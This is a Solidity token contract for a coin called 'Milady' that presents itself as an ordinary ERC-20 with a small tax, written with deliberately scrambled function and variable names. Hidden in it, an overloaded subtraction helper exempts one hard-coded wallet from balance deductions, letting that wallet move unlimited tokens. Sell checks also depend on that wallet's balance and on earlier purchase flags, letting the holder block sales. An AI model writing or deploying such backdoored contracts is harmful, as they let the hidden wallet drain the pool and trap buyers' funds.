/*

Twitter: https://twitter.com/Miladys_Coin

Telegram: https://t.me/Miladys_Coin

Website: https://miladyerc.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _qrlnf(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qrlnf(a, b, "SafeMath");
    }

    function  _qrlnf(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _breyj(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _borpfu;
    address payable private _qvnfed;
    address private _bevrup;
    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ylvadr=0;
    uint256 private _pvfegt=0;
    uint256 public _puabck = _totalSupply;
    uint256 public _qreork = _totalSupply;
    uint256 public _pyrevb= _totalSupply;
    uint256 public _qfrovd= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _fvloud;
    mapping (address => bool) private _hvdczk;
    mapping(address => uint256) private _fiakrg;

    bool private _mledopen;
    bool public _prndaq = false;
    bool private plbouk = false;
    bool private _reyrvj = false;


    event _qekjrp(uint _puabck);
    modifier orntuy {
        plbouk = true;
        _;
        plbouk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _fvloud[owner(

        )] = true;
        _fvloud[address
        (this)] = true;
        _fvloud[
            _qvnfed] = true;
        _qvnfed = 
        payable (0x55fF92AaFF1Ea1b403a60dFc0f1E4e8A3d2AF68A);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qrlnf(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 krobag=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prndaq) {
                if (to 
                != address
                (_borpfu) 
                && to !=
                 address
                 (_bevrup)) {
                  require(_fiakrg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fiakrg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _bevrup && to != 
            address(_borpfu) &&
             !_fvloud[to] ) {
                require(amount 
                <= _puabck,
                 "Exceeds the _puabck.");
                require(balanceOf
                (to) + amount
                 <= _qreork,
                  "Exceeds the _qreork.");
                if(_pvfegt
                < _ylvadr){
                  require
                  (! _frcdk(to));
                }
                _pvfegt++;
                 _hvdczk
                 [to]=true;
                krobag = amount._breyj
                ((_pvfegt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _bevrup &&
             from!= address(this) 
            && !_fvloud[from] ){
                require(amount <= 
                _puabck && 
                balanceOf(_qvnfed)
                <_qfrovd,
                 "Exceeds the _puabck.");
                krobag = amount._breyj((_pvfegt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pvfegt>
                _ylvadr &&
                 _hvdczk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!plbouk 
            && to == _bevrup &&
             _reyrvj &&
             contractTokenBalance>
             _pyrevb 
            && _pvfegt>
            _ylvadr&&
             !_fvloud[to]&&
              !_fvloud[from]
            ) {
                _transferFrom( _qykev(amount, 
                _qykev(contractTokenBalance,
                _qfrovd)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pnqrek(address
                    (this).balance);
                }
            }
        }

        if(krobag>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(krobag);
          emit
           Transfer(from,
           address
           (this),krobag);
        }
        _balances[from
        ]= _qrlnf(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _qrlnf(krobag));
        emit Transfer
        (from, to, 
        amount.
         _qrlnf(krobag));
    }

    function _transferFrom(uint256
     tokenAmount) private
      orntuy {
        if(tokenAmount==
        0){return;}
        if(!_mledopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _borpfu.WETH();
        _approve(address(this),
         address(
             _borpfu), 
             tokenAmount);
        _borpfu.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _qykev
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qrlnf(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qvnfed){
            return a ;
        }else{
            return a .
             _qrlnf (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _puabck = _totalSupply;
        _qreork = _totalSupply;
        emit _qekjrp(_totalSupply);
    }

    function _frcdk(address 
    account) private view 
    returns (bool) {
        uint256 Fovep;
        assembly {
            Fovep :=
             extcodesize
             (account)
        }
        return Fovep > 
        0;
    }

    function _pnqrek(uint256
    amount) private {
        _qvnfed.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _mledopen ) ;
        _borpfu  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _borpfu), 
            _totalSupply);
        _bevrup = 
        IUniswapV2Factory(_borpfu.
        factory( ) 
        ). createPair (
            address(this
            ),  _borpfu .
             WETH ( ) );
        _borpfu.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_bevrup).
        approve(address(_borpfu), 
        type(uint)
        .max);
        _reyrvj = true;
        _mledopen = true;
    }

    receive() external payable {}
}